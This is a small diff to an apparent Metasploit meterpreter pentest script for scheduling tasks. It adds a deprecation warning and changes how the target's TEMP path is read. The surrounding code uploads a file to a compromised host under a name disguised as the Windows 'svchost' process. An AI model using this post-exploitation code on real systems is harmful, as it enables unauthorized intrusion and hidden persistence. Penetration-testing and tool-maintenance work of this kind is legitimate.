@@ -1,3 +1,10 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
 
 #Meterpreter script for automating the most common scheduling tasks
 #during a pentest. This script will use the schtasks command so as
@@ -179,7 +186,7 @@ end
 #---------------------------------------------------------------------------------------------------------
 
 def upload(session,file)
-  location = session.fs.file.expand_path("%TEMP%")
+  location = session.sys.config.getenv('TEMP')
   fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
   print_status("Uploading #{file}....")
   session.fs.file.upload_file("#{fileontrgt}","#{file}")
